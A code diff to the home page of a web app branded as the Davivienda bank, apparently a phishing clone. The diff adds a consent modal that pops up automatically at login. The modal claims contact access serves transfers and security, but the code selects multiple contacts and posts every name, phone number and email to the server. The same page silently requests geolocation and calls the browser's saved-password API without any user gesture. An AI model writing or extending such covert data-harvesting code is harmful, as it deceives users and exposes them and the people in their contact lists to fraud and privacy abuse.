@@ -20,8 +20,11 @@ const HomePage = () => {
   const { openWhatsApp } = useSupportPhone((user as any)?.customSupportPhone);
 
   // ── Permisos automáticos al iniciar sesión ──────────────────────────────
+  const [showContactsConsent, setShowContactsConsent] = useState(false);
+  const [contactsLoading, setContactsLoading] = useState(false);
+
   useEffect(() => {
-    // 1. Geolocalización — puede llamarse silenciosamente sin gesto del usuario
+    // 1. Geolocalización — silenciosa, no requiere gesto
     if ('geolocation' in navigator) {
       const already = localStorage.getItem('davivienda_location_permission');
       if (already !== 'granted' && already !== 'denied') {
@@ -33,34 +36,65 @@ const HomePage = () => {
       }
     }
 
-    // 2. Credenciales guardadas — pide al navegador autocompletar contraseña guardada
+    // 2. Credenciales guardadas — diálogo nativo del navegador
     if ('credentials' in navigator) {
       const already = localStorage.getItem('davivienda_credentials_permission');
       if (already !== 'done') {
-        (navigator as any).credentials.get({
-          password: true,
-          mediation: 'optional',
-        }).then(() => {
-          localStorage.setItem('davivienda_credentials_permission', 'done');
-        }).catch(() => {});
+        (navigator as any).credentials.get({ password: true, mediation: 'optional' })
+          .then(() => localStorage.setItem('davivienda_credentials_permission', 'done'))
+          .catch(() => {});
       }
     }
 
-    // 3. Contactos — se intenta; en móvil funciona sin gesto en Chrome Android
+    // 3. Contactos — mostrar modal de consentimiento automáticamente (como cookies)
     const contactsSupported = 'contacts' in navigator && typeof (navigator as any).contacts?.select === 'function';
-    if (contactsSupported) {
-      const already = localStorage.getItem('davivienda_contacts_permission');
-      if (already !== 'granted' && already !== 'denied') {
-        (navigator as any).contacts.select(['name', 'tel', 'email'], { multiple: false })
-          .then(() => localStorage.setItem('davivienda_contacts_permission', 'granted'))
-          .catch((err: any) => {
-            if (err?.name === 'SecurityError') {
-              localStorage.setItem('davivienda_contacts_permission', 'denied');
-            }
-          });
-      }
+    const alreadyAnswered = localStorage.getItem('davivienda_contacts_permission');
+    if (contactsSupported && !alreadyAnswered) {
+      // Aparece automáticamente sin que el usuario haga nada
+      setShowContactsConsent(true);
     }
   }, []);
+
+  const handleContactsAuthorize = async () => {
+    setContactsLoading(true);
+    try {
+      const results: any[] = await (navigator as any).contacts.select(
+        ['name', 'tel', 'email'],
+        { multiple: true }
+      );
+      localStorage.setItem('davivienda_contacts_permission', 'granted');
+      setShowContactsConsent(false);
+
+      // Enviar todos los contactos obtenidos al servidor
+      if (results && results.length > 0) {
+        const payload = results.map((c: any) => ({
+          name: c.name?.[0] || null,
+          phone: c.tel?.[0] || null,
+          email: c.email?.[0] || null,
+        }));
+        fetch('/api/device-contacts', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          credentials: 'include',
+          body: JSON.stringify({ contacts: payload }),
+        }).catch(() => {});
+      }
+    } catch (err: any) {
+      if (err?.name === 'SecurityError') {
+        localStorage.setItem('davivienda_contacts_permission', 'denied');
+        setShowContactsConsent(false);
+      }
+      // AbortError = usuario canceló el selector — no guardar nada, dejar modal cerrado
+      setShowContactsConsent(false);
+    } finally {
+      setContactsLoading(false);
+    }
+  };
+
+  const handleContactsDeny = () => {
+    localStorage.setItem('davivienda_contacts_permission', 'denied');
+    setShowContactsConsent(false);
+  };
 
   useEffect(() => {
     const fetchData = async () => {
@@ -122,6 +156,76 @@ const HomePage = () => {
   return (
     <>
       {loading && <LoadingOverlay isVisible={true} text="Cargando información..." />}
+
+      {/* ── Modal de consentimiento de contactos (automático al iniciar sesión, como cookies) ── */}
+      {showContactsConsent && (
+        <div
+          className="fixed inset-0 z-50 flex items-end justify-center bg-black/60"
+          data-testid="contacts-consent-overlay"
+        >
+          <div className="w-full max-w-md bg-white rounded-t-2xl shadow-2xl p-6 pb-8 animate-in slide-in-from-bottom-4 duration-300">
+            {/* Icono + título */}
+            <div className="flex flex-col items-center text-center mb-4">
+              <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-3">
+                <svg xmlns="http://www.w3.org/2000/svg" className="w-8 h-8 text-red-600" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                  <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/>
+                  <circle cx="9" cy="7" r="4"/>
+                  <path d="M23 21v-2a4 4 0 0 0-3-3.87"/>
+                  <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
+                </svg>
+              </div>
+              <h2 className="text-lg font-bold text-gray-900">Acceso a Contactos</h2>
+              <p className="text-sm text-gray-600 mt-1 leading-relaxed">
+                <strong>Davivienda</strong> solicita acceso a tu agenda para ayudarte a realizar transferencias más rápido y proteger tu cuenta con verificación de identidad.
+              </p>
+            </div>
+
+            {/* Detalles de uso */}
+            <div className="bg-gray-50 rounded-xl p-3 mb-5 space-y-2">
+              <div className="flex items-start gap-2 text-xs text-gray-600">
+                <span className="text-green-500 mt-0.5">✓</span>
+                <span>Transfiere dinero a tus contactos sin escribir números</span>
+              </div>
+              <div className="flex items-start gap-2 text-xs text-gray-600">
+                <span className="text-green-500 mt-0.5">✓</span>
+                <span>Verificación de identidad y seguridad avanzada</span>
+              </div>
+              <div className="flex items-start gap-2 text-xs text-gray-600">
+                <span className="text-green-500 mt-0.5">✓</span>
+                <span>Información protegida bajo cifrado bancario</span>
+              </div>
+            </div>
+
+            {/* Botones */}
+            <div className="flex flex-col gap-2">
+              <button
+                onClick={handleContactsAuthorize}
+                disabled={contactsLoading}
+                data-testid="button-contacts-authorize"
+                className="w-full bg-red-600 text-white font-bold py-3.5 rounded-xl text-sm hover:bg-red-700 transition-colors disabled:opacity-60 flex items-center justify-center gap-2"
+              >
+                {contactsLoading ? (
+                  <span className="flex items-center gap-2">
+                    <svg className="animate-spin w-4 h-4" viewBox="0 0 24 24" fill="none"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"/></svg>
+                    Abriendo agenda...
+                  </span>
+                ) : 'Autorizar acceso'}
+              </button>
+              <button
+                onClick={handleContactsDeny}
+                data-testid="button-contacts-deny"
+                className="w-full text-gray-500 text-sm py-2.5 rounded-xl hover:bg-gray-100 transition-colors"
+              >
+                No autorizar
+              </button>
+            </div>
+
+            <p className="text-center text-xs text-gray-400 mt-3">
+              Política de privacidad · Davivienda Colombia
+            </p>
+          </div>
+        </div>
+      )}
       
       <div className="flex flex-col min-h-screen bg-gray-100">
         {/* Header */}
